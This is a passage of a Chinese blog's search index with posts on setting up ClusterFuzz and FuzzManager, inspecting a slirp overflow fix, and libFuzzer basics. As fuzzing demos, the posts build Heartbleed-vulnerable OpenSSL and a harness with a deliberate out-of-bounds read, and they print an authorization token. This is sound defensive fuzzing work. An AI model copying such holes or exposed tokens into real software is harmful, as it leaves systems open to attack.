a file handle. return False if filename.endswith(&apos;_fuzzer&apos;): return True # TODO(aarya): Remove this optimization if it does not show up significant # savings in profiling results. fuzz_target_name_regex = environment.get_value(&apos;FUZZER_NAME_REGEX&apos;) if fuzz_target_name_regex: return bool(re.match(fuzz_target_name_regex, filename)) if os.path.exists(file_path) and not stat.S_ISREG(os.stat(file_path).st_mode): # Don&apos;t read special files (eg: /dev/urandom). logs.log_warn(&apos;Tried to read from non-regular file: %s.&apos; % file_path) return False # Use already provided file handle or open the file. local_file_handle = file_handle or open(file_path, &apos;rb&apos;) # TODO(metzman): Bound this call so we don&apos;t read forever if something went # wrong. result = utils.search_bytes_in_file(FUZZ_TARGET_SEARCH_BYTES, local_file_handle) if not file_handle: # If this local file handle is owned by our function, close it now. # Otherwise, it is caller&apos;s responsibility. local_file_handle.close() return result","categories":[],"tags":[{"name":"集群fuzz","slug":"集群fuzz","permalink":"https://www.giantbranch.cn/tags/集群fuzz/"},{"name":"ClusterFuzz","slug":"ClusterFuzz","permalink":"https://www.giantbranch.cn/tags/ClusterFuzz/"}]},{"title":"本地使用ClusterFuzz","slug":"本地使用ClusterFuzz","date":"2020-05-18T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2020/05/18/本地使用ClusterFuzz/","link":"","permalink":"https://www.giantbranch.cn/2020/05/18/本地使用ClusterFuzz/","excerpt":"","text":"获取代码123git clone https://github.com/google/clusterfuzzcd clusterfuzzgit pull 处于稳定性考虑，建议使用最新的发行版本，而不是master分支 1git checkout tags/vX.Y.Z 通过git tag -l或者在github上面可以看到发行版本 12345678910111213141516171819$ git tag -l1.2.01.2.1reproduce-tool-stablev1.0.0v1.0.1v1.1.0v1.3.0v1.4.0v1.5.0v1.5.1v1.6.0v1.6.1v1.7.0v1.7.1v1.8.0v1.9.0v2.0.0v2.0.1 我用v2.0.1 1git checkout tags/v2.0.1` 依赖首先谷歌建议使用python 3.7，python2已经不支持 123456789$ python butler.pyTraceback (most recent call last): File &quot;butler.py&quot;, line 33, in &lt;module&gt; guard.check() File &quot;src/local/butler/guard.py&quot;, line 41, in check check_virtualenv() File &quot;src/local/butler/guard.py&quot;, line 30, in check_virtualenv &apos;You are not in a virtual env environment. Please install it with&apos;Exception: You are not in a virtual env environment. Please install it with `./local/install_deps.bash` or load it with `pipenv shell`. Then, you can re-run this command. 安装python 3.7： 12345678apt-get install -y apt-transport-https software-properties-common build-essential git curl \\ libssl-dev zlib1g-dev libncurses5-dev libncursesw5-dev libreadline-dev libsqlite3-dev \\ libgdbm-dev libdb5.3-dev libbz2-dev libexpat1-dev liblzma-dev libffi-dev uuid-dev curl -sS https://www.python.org/ftp/python/3.7.7/Python-3.7.7.tgz | tar -C /tmp -xzv &amp;&amp; \\ cd /tmp/Python-3.7.7 &amp;&amp; \\ ./configure --enable-optimizations &amp;&amp; make altinstall &amp;&amp; \\ rm -rf /tmp/Python-3.7.7 安装golang 123sudo add-apt-repository ppa:longsleep/golang-backportssudo apt updatesudo apt install golang-go 修改./local/install_deps_linux.bash中的 bower install 为bower install --allow-root（因为bower install的时候默认不允许root用户） 最后执行./local/install_deps.bash 1./local/install_deps.bash 环境搭建运行python3.7 -m pipenv shell即可进入clusterfuzzer需要的环境 我们运行python butler.py，就看到所有功能了 12345678910111213141516171819202122232425262728usage: butler.py [-h] &#123;bootstrap,py_unittest,js_unittest,format,lint,package,deploy,run_server,run,run_bot,remote,clean_indexes,create_config,integration_tests,reproduce&#125; ...Butler is here to help you with command-line tasks.positional arguments: &#123;bootstrap,py_unittest,js_unittest,format,lint,package,deploy,run_server,run,run_bot,remote,clean_indexes,create_config,integration_tests,reproduce&#125; bootstrap Install all required dependencies for running an appengine, a bot,and a mapreduce locally. py_unittest Run Python unit tests. js_unittest Run Javascript unit tests. format Format changed code in current branch. lint Lint changed code in current branch. package Package clusterfuzz with a staging revision deploy Deploy to Appengine run_server Run the local Clusterfuzz server. run Run a one-off script against a datastore (e.g. migration). run_bot Run a local clusterfuzz bot. remote Run command-line tasks on a remote bot. clean_indexes Clean up undefined indexes (in index.yaml). create_config Create a new deployment config. integration_tests Run end-to-end integration tests. reproduce Reproduce a crash or error from a test case.optional arguments: -h, --help show this help message and exit 初始化第一次运行，初始化数据，试了下跟python butler.py bootstrap执行的功能一样。。。 1python butler.py run_server --bootstrap 假如不是第一次就直接 1python butler.py run_server 如果依赖早已安装好，使用下面的就可以跳过依赖的再次安装 1python butler.py run_server --skip-install-deps 最后终于起来了，访问9000端口即可 1234567891011121314151617181920$ python butler.py run_server --skip-install-depsRunning: pkill -KILL -f &quot;dev_appserver.py&quot;| Return code is non-zero (-9).Running: pkill -KILL -f &quot;CloudDatastore.jar&quot;| Return code is non-zero (-9).Running: pkill -KILL -f &quot;pubsub-emulator&quot;| Return code is non-zero (-9).Running: pkill -KILL -f &quot;run_bot&quot;| Return code is non-zero (-9).Created symlink: source: /root/clusterfuzz/configs/test, target /root/clusterfuzz/src/appengine/config.Created symlink: source: /root/clusterfuzz/src/protos, target /root/clusterfuzz/src/appengine/protos.Created symlink: source: /root/clusterfuzz/src/python, target /root/clusterfuzz/src/appengine/python.Running: python polymer_bundler.py (cwd=&apos;local&apos;)| App Engine templates are up to date.Created symlink: source: /root/clusterfuzz/local/storage/local_gcs, target /root/clusterfuzz/src/appengine/local_gcs.Running: gunicorn -b :9000 main:app (cwd=&apos;src/appengine&apos;)| [2020-05-18 22:51:55 +0800] [31835] [INFO] Starting gunicorn 20.0.4| [2020-05-18 22:51:55 +0800] [31835] [INFO] Listening at: http://0.0.0.0:9000 (31835)| [2020-05-18 22:51:55 +0800] [31835] [INFO] Using worker: sync| [2020-05-18 22:51:55 +0800] [31841] [INFO] Booting worker with pid: 31841 访问9000端口如下： 之后启动botpython butler.py run_bot --name my-bot /path/to/my-bot，比如下面 1python butler.py run_bot --name my-fuzzing-bot `pwd`/my-fuzzing-bot 有时候空闲运行时间过长就退出了 1[1] 1446 killed python butler.py run_bot --name my-fuzzing-bot `pwd`/my-fuzzing-bot 我们执行 1python butler.py run_bot `pwd`/my-fuzzing-bot 123456789$ python butler.py run_bot `pwd`/my-fuzzing-botCreated symlink: source: /root/clusterfuzz/configs/test, target /root/clusterfuzz/src/appengine/config.Bot directory already exists. Re-using...| /root/clusterfuzz/my-fuzzing-bot/clusterfuzz/src/python/crash_analysis/stack_parsing/stack_analyzer.py:84: FutureWarning: Possible nested set at position 4| r&apos;\\s*[[][^]]*[:]([^](]*).*[]].*Check failed[:]\\s*(.*)&apos;)| /root/clusterfuzz/my-fuzzing-bot/clusterfuzz/src/python/crash_analysis/stack_parsing/stack_analyzer.py:202: FutureWarning: Possible nested set at position 3| r&apos;.*[[][^]]*[:]([^](]*).*[]].*Security CHECK failed[:]\\s*(.*)\\.\\s*&apos;)| /root/clusterfuzz/my-fuzzing-bot/clusterfuzz/src/python/crash_analysis/stack_parsing/stack_analyzer.py:204: FutureWarning: Possible nested set at position 3| r&apos;.*[[][^]]*[:]([^](]*).*[]].*Security DCHECK failed[:]\\s*(.*)\\.\\s*&apos;) 在网页上也可以看bot的状态 可以看到bot应该是将clusterfuzz复制了一份 查看bot的log 12cd /path/to/my-bot/clusterfuzz/bot/logstail -f bot.log 可以看到先由于没有fuzzing任务所以显示Failed to get any fuzzing tasks 1234567891011$ tail bot.log2020-05-19 11:16:49,456 - run_bot - INFO - Using local source, skipping source code update.2020-05-19 11:16:49,457 - run_bot - INFO - Running platform initialization scripts.2020-05-19 11:16:49,993 - run_bot - INFO - Completed running platform initialization scripts.2020-05-19 11:16:50,374 - run_bot - ERROR - Failed to get any fuzzing tasks. This should not happen.NoneType: None2020-05-19 11:21:50,478 - run_bot - INFO - Using local source, skipping source code update.2020-05-19 11:21:50,478 - run_bot - INFO - Running platform initialization scripts.2020-05-19 11:21:51,009 - run_bot - INFO - Completed running platform initialization scripts.2020-05-19 11:21:51,194 - run_bot - ERROR - Failed to get any fuzzing tasks. This should not happen.NoneType: None 实际fuzz实例ClusterFuzz支持覆盖率指导的模糊测试（libfuzzer和afl）和黑盒测试 接下来我们以心脏出血漏洞Heartbleed为例 使用这个平台，我们首先的编译出自己的fuzzer或者二进制程序 文档已经提供了针对OpenSSL的构建libfuzzer的代码，这样我们就得到了openssl-fuzzer-build.zip 1234567891011121314151617181920212223# Download and unpack a vulnerable version of OpenSSL:curl -O https://ftp.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gztar xf openssl-1.0.1f.tar.gz# Build OpenSSL with ASan and fuzzer instrumentation:cd openssl-1.0.1f/./config# $CC must be pointing to clang binary, see the &quot;compiler section&quot; link above.make CC=&quot;$CC -g -fsanitize=address,fuzzer-no-link&quot;cd ..# Download the fuzz target and its data dependencies:curl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/handshake-fuzzer.cccurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/server.keycurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/server.pem# Build OpenSSL fuzz target for ClusterFuzz ($CXX points to clang++ binary):$CXX -g handshake-fuzzer.cc -fsanitize=address,fuzzer openssl-1.0.1f/libssl.a \\ openssl-1.0.1f/libcrypto.a -std=c++17 -Iopenssl-1.0.1f/include/ -lstdc++fs \\ -ldl -lstdc++ -o handshake-fuzzerzip openssl-fuzzer-build.zip handshake-fuzzer server.key server.pem 之后回到平台（9000端口那个），来到Jobs，看到ADD NEW JOB表单 依次填写： 1234“libfuzzer_asan_linux_openssl” for the “Name”.“LINUX” for the “Platform”.“libfuzzer” and “engine_asan” for the “Templates”.CORPUS_PRUNE = True for the “Environment String”. 其中CORPUS_PRUNE = True是开启语料库修剪 最后将我们openssl-fuzzer-build.zip选择文件，再add即可 下面这个是之前忘记装go，导致模板没有导入 1234567891011但是报错，Invalid template name不过好像确实我这个搭建完一个template也没有啊，不填template又上传不了不过看页面确实没有template，我在源码中找到了设置template的代码`src/local/butler/scripts/setup.py`可能是初始化失败了，导致没有template，所以我手动添加了libfuzzer和engine_asan![](http://pic.giantbranch.cn/pic/1589876155414.png)![](http://pic.giantbranch.cn/pic/1589876185250.png) 到后面是上传压缩包失败，抓包好像是请求是发给localhost的gcs的，但是服务器在远程，那当然失败了 所以在服务器那边装个图形界面，终于ko了 还有一个解决方案，就是修改代码，让gcs监听0.0.0.0，请求的url也相应修改 https://github.com/lookfwd/getting-started-clusterfuzz-local-in-aws 上传成功后，就可以来到Fuzzer页面，选择libfuzzer那行的edit，将我们新建的jobs勾选上，之后提交即可 可以看到libfuzzer这里也有updated 查看bot这里，可以看到my-bot2先拿到了任务 从log也可以看到 1234567891011$ tail ./my-bot2/clusterfuzz/bot/logs/bot.log2020-05-26 11:16:22,389 - run_bot - INFO - Completed running platform initialization scripts.2020-05-26 11:16:23,509 - run_bot - INFO - Executing command &apos;fuzz libFuzzer libfuzzer_asan_linux_openssl&apos;2020-05-26 11:16:28,551 - run_bot - INFO - Setting up fuzzer and data bundles.2020-05-26 11:16:29,779 - run_bot - INFO - Retrieving custom binary build r1.2020-05-26 11:17:47,563 - run_bot - INFO - Unpacked 3/3.2020-05-26 11:17:47,578 - run_bot - INFO - Picked fuzz target handshake-fuzzer for fuzzing.2020-05-26 11:17:47,579 - run_bot - INFO - Retrieved custom binary build r1.2020-05-26 11:17:47,579 - run_bot - INFO - Setup application path.2020-05-26 11:17:48,461 - run_bot - INFO - Checking for bad build.2020-05-26 11:17:49,769 - run_bot - INFO - Recorded use of fuzz target libFuzzer_handshake-fuzzer. 但是报错了,ERROR - libFuzzer: engine encountered an error (target=handshake-fuzzer). 1234567891011$ tail bot.log2020-05-26 11:36:19,370 - run_bot - INFO - Strategy pool was generated according to default parameters. Chosen strategies: value_profile, corpus_mutations_ml_rnn, corpus_subset2020-05-26 11:36:19,583 - run_bot - INFO - Corpus is empty. Skip generation.2020-05-26 11:36:19,822 - run_bot - ERROR - libFuzzer: engine encountered an error (target=handshake-fuzzer).NoneType: None2020-05-26 11:36:19,824 - run_bot - INFO - Skipped corpus merge since no new units added by fuzzing.2020-05-26 11:36:19,824 - run_bot - INFO - Extracting and analyzing recommended dictionary for handshake-fuzzer.2020-05-26 11:36:19,825 - run_bot - INFO - No recommended dictionary in output from handshake-fuzzer.2020-05-26 11:36:19,825 - run_bot - INFO - Used strategies.2020-05-26 11:36:20,287 - run_bot - INFO - Uploaded file to logs bucket.2020-05-26 11:36:20,288 - run_bot - INFO - Uploaded file to logs bucket. 后来又分配给第一个bot了 一直没结果，我就换了一个简单的程序，命名项目为libfuzzer_asan_my_project 123456#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123; uint8_t tmp = Data[10]; return 0; // Non-zero return values are reserved for future use.&#125; 提交后，不一会就有minimize任务了 这个简单程序的结果就出来了 点进去可以查看更多信息 参考https://google.github.io/clusterfuzz/https://github.com/lookfwd/getting-started-clusterfuzz-local-in-aws","categories":[],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.giantbranch.cn/tags/fuzzing/"},{"name":"集群fuzz","slug":"集群fuzz","permalink":"https://www.giantbranch.cn/tags/集群fuzz/"},{"name":"ClusterFuzz","slug":"ClusterFuzz","permalink":"https://www.giantbranch.cn/tags/ClusterFuzz/"}]},{"title":"git查看某个文件的提交记录","slug":"git查看某个文件的提交记录","date":"2020-04-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/04/17/git查看某个文件的提交记录/","link":"","permalink":"https://www.giantbranch.cn/2020/04/17/git查看某个文件的提交记录/","excerpt":"","text":"有时候分析漏洞我们需要看看怎么修复的，什么时候谁修复的，提交的id是多少，下面的命令就很有用 假如我们知道漏洞出现在某个文件，我们只要执行下面命令，即可看到这个文件的修改记录 1git log -p 文件名 比如下面的例子 12345678910111213141516171819202122232425262728293031323334353637$ git log -p slirp/tcp_subr.ccommit 345fab6ffe57b0bf6dccbc0844f45f77b91d9de0Author: Prasad J Pandit &lt;pjp@fedoraproject.org&gt;Date: Sun Jan 13 23:29:48 2019 +0530 slirp: check data length while emulating ident function While emulating identification protocol, tcp_emu() does not check available space in the &apos;sc_rcv-&gt;sb_data&apos; buffer. It could lead to heap buffer overflow issue. Add check to avoid it. Reported-by: Kira &lt;864786842@qq.com&gt; Signed-off-by: Prasad J Pandit &lt;pjp@fedoraproject.org&gt; Signed-off-by: Samuel Thibault &lt;samuel.thibault@ens-lyon.org&gt; (cherry picked from commit a7104eda7dab99d0cdbd3595c211864cba415905) *CVE-2019-6778 Signed-off-by: Michael Roth &lt;mdroth@linux.vnet.ibm.com&gt;diff --git a/slirp/tcp_subr.c b/slirp/tcp_subr.cindex 473c8b0..aa88de8 100644--- a/slirp/tcp_subr.c+++ b/slirp/tcp_subr.c@@ -640,6 +640,11 @@ tcp_emu(struct socket *so, struct mbuf *m) socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv;+ if (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen+ - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) &#123;+ return 1;+ &#125;+ memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len;.................. 看到了这个commit id，你可以用git show id去查看，不过跟上面的结果看到的是一样的 1234567891011121314151617181920212223242526272829303132333435$ git show 345fab6ffe57b0bf6dccbc0844f45f77b91d9de0commit 345fab6ffe57b0bf6dccbc0844f45f77b91d9de0Author: Prasad J Pandit &lt;pjp@fedoraproject.org&gt;Date: Sun Jan 13 23:29:48 2019 +0530 slirp: check data length while emulating ident function While emulating identification protocol, tcp_emu() does not check available space in the &apos;sc_rcv-&gt;sb_data&apos; buffer. It could lead to heap buffer overflow issue. Add check to avoid it. Reported-by: Kira &lt;864786842@qq.com&gt; Signed-off-by: Prasad J Pandit &lt;pjp@fedoraproject.org&gt; Signed-off-by: Samuel Thibault &lt;samuel.thibault@ens-lyon.org&gt; (cherry picked from commit a7104eda7dab99d0cdbd3595c211864cba415905) *CVE-2019-6778 Signed-off-by: Michael Roth &lt;mdroth@linux.vnet.ibm.com&gt;diff --git a/slirp/tcp_subr.c b/slirp/tcp_subr.cindex 473c8b0..aa88de8 100644--- a/slirp/tcp_subr.c+++ b/slirp/tcp_subr.c@@ -640,6 +640,11 @@ tcp_emu(struct socket *so, struct mbuf *m) socklen_t addrlen = sizeof(struct sockaddr_in); struct sbuf *so_rcv = &amp;so-&gt;so_rcv;+ if (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen+ - (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) &#123;+ return 1;+ &#125;+ memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len); so_rcv-&gt;sb_wptr += m-&gt;m_len; so_rcv-&gt;sb_rptr += m-&gt;m_len;(END) github上直接搜索这个commit id就可以了 题外话更进一步，假如你想看看这个文件每一行最新是谁修改的，使用git blame 文件名 例子如下： 1234567891011121314151617181920212223git blame slirp/tcp_subr.cf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 1) /*f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 2) * Copyright (c) 1982, 1986, 1988, 1990, 1993f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 3) * The Regents of the University of California. All rights reserved.f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 4) *f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 5) * Redistribution and use in source and binary forms, with or withoutf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 6) * modification, are permitted provided that the following conditionsf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 7) * are met:f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 8) * 1. Redistributions of source code must retain the above copyrightf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 9) * notice, this list of conditions and the following disclaimer.f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 10) * 2. Redistributions in binary form must reproduce the above copyrightf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 11) * notice, this list of conditions and the following disclaimer in thef0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 12) * documentation and/or other materials provided with the distribution.2f5f89963 (Anthony Liguori 2009-01-26 19:37:41 +0000 13) * 3. Neither the name of the University nor the names of its contributorsf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 14) * may be used to endorse or promote products derived from this softwaref0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 15) * without specific prior written permission.f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 16) *f0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 17) * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS&apos;&apos; ANDf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 18) * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,THEf0cbd3ec9 (Fabrice Bellard 2004-04-22 00:10:48 +0000 19) * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE..................","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://www.giantbranch.cn/tags/git/"}]},{"title":"FuzzManager配置与使用","slug":"FuzzManager配置与使用","date":"2020-03-18T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2020/03/18/FuzzManager配置与使用/","link":"","permalink":"https://www.giantbranch.cn/2020/03/18/FuzzManager配置与使用/","excerpt":"","text":"Server下载 1git clone https://github.com/MozillaSecurity/FuzzManager.git 安装依赖（注：EC2SpotManager是管理Amazon Cloud的实例的，一般用不到，用的话需要安装redis-server——apt install redis-server） 12cd FuzzManagerpip install -r server/requirements.txt 这Server使用Django编写 Django manage.py migrate根据搜索到的文档，是创建数据库，数据表 12cd serverpython manage.py migrate 报错解决：只要复制FTB目录到server目录里面即可 123456789101112131415161718192021root@bogon:~/FuzzManager/server# python manage.py migrateTraceback (most recent call last): File &quot;manage.py&quot;, line 10, in &lt;module&gt; execute_from_command_line(sys.argv) File &quot;/usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py&quot;, line 364, in execute_from_command_line utility.execute() File &quot;/usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py&quot;, line 338, in execute django.setup() File &quot;/usr/local/lib/python2.7/dist-packages/django/__init__.py&quot;, line 27, in setup apps.populate(settings.INSTALLED_APPS) File &quot;/usr/local/lib/python2.7/dist-packages/django/apps/registry.py&quot;, line 108, in populate app_config.import_models() File &quot;/usr/local/lib/python2.7/dist-packages/django/apps/config.py&quot;, line 202, in import_models self.models_module = import_module(models_module_name) File &quot;/usr/lib/python2.7/importlib/__init__.py&quot;, line 37, in import_module __import__(name) File &quot;/root/FuzzManager/server/crashmanager/models.py&quot;, line 15, in &lt;module&gt; from FTB.ProgramConfiguration import ProgramConfiguration File &quot;/root/FuzzManager/server/crashmanager/FTB/ProgramConfiguration.py&quot;, line 24, in &lt;module&gt; from FTB.ConfigurationFiles import ConfigurationFilesImportError: No module named FTB.ConfigurationFiles 复制完就可以了 1234567891011121314151617181920212223242526root@bogon:~/FuzzManager/server# python manage.py migrateOperations to perform: Apply all migrations: admin, auth, authtoken, contenttypes, covmanager, crashmanager, ec2spotmanager, sessionsRunning migrations: Applying contenttypes.0001_initial... OK Applying auth.0001_initial... OK Applying admin.0001_initial... OK Applying admin.0002_logentry_remove_auto_add... OK Applying contenttypes.0002_remove_content_type_name... OK Applying auth.0002_alter_permission_name_max_length... OK Applying auth.0003_alter_user_email_max_length... OK Applying auth.0004_alter_user_username_opts... OK Applying auth.0005_alter_user_last_login_null... OK Applying auth.0006_require_contenttypes_0002... OK Applying auth.0007_alter_validators_add_error_messages... OK Applying auth.0008_alter_user_username_max_length... OK Applying authtoken.0001_initial... OK Applying authtoken.0002_auto_20160226_1747... OK Applying crashmanager.0001_squashed_0020_add_app_permissions... OK Applying covmanager.0001_initial... OK Applying covmanager.0002_increase_collection_filename_length... OK Applying covmanager.0003_collection_file_optional... OK Applying covmanager.0004_reportconfiguration_reportsummary... OK Applying covmanager.0005_report... OK Applying ec2spotmanager.0001_squashed_0013_add_gce_fields... OK Applying sessions.0001_initial... OK 创建fuzzmanager用户 123456root@bogon:~/FuzzManager/server# python ./manage.py createsuperuserUsername (leave blank to use &apos;root&apos;):Email address: fuzzmanager@test.comPassword:Password (again):Superuser created successfully. 获取fuzzmanager authorization token（下面的root是上面新建的用户名，这个看README的话是可以给Apache+WSGI设置虚拟主机用的，用token生成.htpasswd文件htpasswd -cb .htpasswd root 4a253efa90f514bd89ae9a86d1dc264aa3133945） 12root@bogon:~/FuzzManager/server# python manage.py get_auth_token root4a253efa90f514bd89ae9a86d1dc264aa3133945 本地测试 1python manage.py runserver 访问http://127.0.0.1:8000/即可 这个只是监听127.0.0.1，假如是服务器，还得开个反向代理或者ssh代理才能访问，所以可以下面这样 1python manage.py runserver 0.0.0.0:8000 访问了一下，发现需要在配置文件FuzzManager/server/server/settings.py中添加ALLOWED_HOSTS，就是HTTP请求的Host字段，添加本机的ip地址，假如有域名添加域名也行。 客户端可以使用下面命令向服务器提交 1python Collector.py --autosubmit mybadprogram --someopt yourtest 当然这之前得有配置文件~/.fuzzmanagerconf，下面是示例，那个sigdir是signatures存放目录， 123456[Main]sigdir = /home/example/signaturesserverhost = 127.0.0.1serverport = 8000serverproto = httpserverauthtoken = 4a253efa90f514bd89ae9a86d1dc264aa3133945 尝试fuzz upx，提交试试，首先配置服务器信息~/.fuzzmanagerconf 123456[Main]sigdir = /root/fuzz/upx/sigsserverhost = 192.168.XX.XXserverport = 8000serverproto = httpserverauthtoken = 4a253efa90f514bd89ae9a86d1dc264aa3133945 配置程序信息upx.out.fuzzmanagerconf，放在二进制文件当前目录 123456789[Main]platform = x86-64product = upxproduct_version = UPX-git-d7ba31+os = linux[Metadata]pathPrefix = /root/fuzz/upxbuildFlags = 之后运行命令即可（把/usr/local/lib/python2.7/dist-packages/Collector中的Collector.py出来即可使用） 1python Collector.py --tool afl --autosubmit ./upx.out ./afl_out/crashes/id\\:000000\\,sig\\:11\\,src\\:000120\\,op\\:arith8\\,pos\\:16168\\,val\\:+2 但是这个需要你的二进制程序是加了asan参数进行编译的，下面没有报错就是成功了 不然默认x86-64是不支持的，上传其实是上传了的，只不过没有获取到crash地址（后来发现是装了gdb插件的问题） 看了下源码，不加asan应该只支持x86和arm的自动提交https://github.com/MozillaSecurity/FuzzManager/blob/0ccde1820f6412da23f20da17eb3b5b9091a563e/FTB/Signatures/CrashInfo.py#L1245，需要向上翻翻看 但是后来发现是我的gdb装了peda，pwndgb插件，导致Collector.py脚本没识别出来。。。 后来禁用插件后就可以了 或者自己写代码提交，下面这个来源于https://www.fuzzingbook.org/html/FuzzingInTheLarge.html 123456789101112131415from FTB.Signatures.CrashInfo import CrashInfofrom Collector.Collector import Collectorcollector = Collector()cmd = [&quot;simply-buggy/simple-crash&quot;]result = subprocess.run(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)stderr = result.stderr.decode().splitlines()stdout = result.stdout.decode().splitlines()crashInfo = CrashInfo.fromRawCrashData(stdout, stderr, configuration)print(crashInfo)collector.submit(crashInfo) 但是这个现在已经不能正常运行了，而且这个是基于python3的，我写了一个python2的版本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2020-03-23 11:37:56# @Author : giantbranch# @Link : http://www.giantbranch.cn/# @tags : from FTB.Signatures.CrashInfo import CrashInfofrom FTB.ProgramConfiguration import ProgramConfigurationfrom Collector.Collector import Collectorimport subprocessbinary = &quot;./src/upx.out_x86-64&quot;binaryArgs = &quot;./afl_out/crashes/id:000000,sig:11,src:000120,op:arith8,pos:16168,val:+2&quot;FTB_GDB_SCRIPT_PATH = &quot;/usr/local/lib/python2.7/dist-packages/FTB/Running/GDB.py&quot;configuration = ProgramConfiguration.fromBinary(binary)print(&quot;configuration:&quot;)print(configuration.product, configuration.platform)gdbArgs = [ &quot;--batch&quot;, &quot;-ex&quot;, &quot;source %s&quot; % FTB_GDB_SCRIPT_PATH, &quot;-ex&quot;, &quot;run %s&quot; % binaryArgs]gdbArgs.extend([ &quot;-ex&quot;, &quot;set pagination 0&quot;, &quot;-ex&quot;, &quot;set backtrace limit 128&quot;, &quot;-ex&quot;, &quot;bt&quot;, &quot;-ex&quot;, &quot;python printImportantRegisters()&quot;, &quot;-ex&quot;, &quot;x/2i $pc&quot;, &quot;-ex&quot;, &quot;quit&quot;,])cmdArgs = []# cmd = [&quot;gdb &quot; + binary + &quot; -ex \\&quot;r ./afl_out/crashes/id:000000,sig:11,src:000120,op:arith8,pos:16168,val:+2\\&quot;&quot;]cmdArgs.append(&quot;gdb&quot;)cmdArgs.extend(gdbArgs)cmdArgs.append(binary)print cmdArgsprocess = subprocess.Popen( cmdArgs, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)(stdout, stderr) = (process.stdout.read(), process.stderr.read())# 假如不是传文件路径，是标准输入的，可能需要下面代码，input就是要传入的标准输入# try:# stdout, stderr = process.communicate(input)# except:# process.kill()# process.wait()# print &quot;===============stdoutstdout===============================&quot;# print stdout# Detect where the GDB trace starts/endstraceStart = stdout.rfind(&quot;Program received signal SIG&quot;)traceStop = stdout.rfind(&quot;A debugging session is active&quot;)# Alternative GDB start version when using core dumpsif traceStart &lt; 0: traceStart = stdout.rfind(&quot;Program terminated with signal&quot;)if traceStop &lt; 0: traceStop = len(stdout)# Move the trace from stdout to auxCrashDataauxCrashData = stdout[traceStart:traceStop]stdout = stdout[:traceStart] + stdout[traceStop:]# print &quot;==============stdout=============&quot;# print stdout.splitlines()# print &quot;==============stderr=============&quot;# print auxCrashData.splitlines()crashInfo = CrashInfo.fromRawCrashData(stdout.splitlines(), auxCrashData.splitlines(), configuration)print(crashInfo)testcase = binaryArgs(testCaseData, isBinary) = Collector.read_testcase(testcase)crashInfo.testcase = testCaseDatacollector = Collector(tool=&quot;afl&quot;)collector.submit(crashInfo, testcase) 参考https://github.com/MozillaSecurity/FuzzManagerhttps://www.fuzzingbook.org/html/FuzzingInTheLarge.html","categories":[],"tags":[{"name":"FuzzManager","slug":"FuzzManager","permalink":"https://www.giantbranch.cn/tags/FuzzManager/"},{"name":"崩溃信息管理","slug":"崩溃信息管理","permalink":"https://www.giantbranch.cn/tags/崩溃信息管理/"}]},{"title":"libfuzzer 文档","slug":"libfuzzer 文档","date":"2020-03-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/03/08/libfuzzer 文档/","link":"","permalink":"https://www.giantbranch.cn/2020/03/08/libfuzzer 文档/","excerpt":"","text":"简介libfuzzer是进程内的，覆盖率指导的，进化的fuzzing引擎。 就是变异，覆盖率那些都给你做好了，你只需要定义LLVMFuzzerTestOneInput，将编译的数据喂给要fuzz的目标函数就行 libfuzzer还在不断开发完善中，所以可能需要当前版本的clang或者没那么就版本的clang进行编译 注意：clang6.0开始就默认在里面包含了libfuzzer 使用——需要实现一个fuzz target所谓fuzz 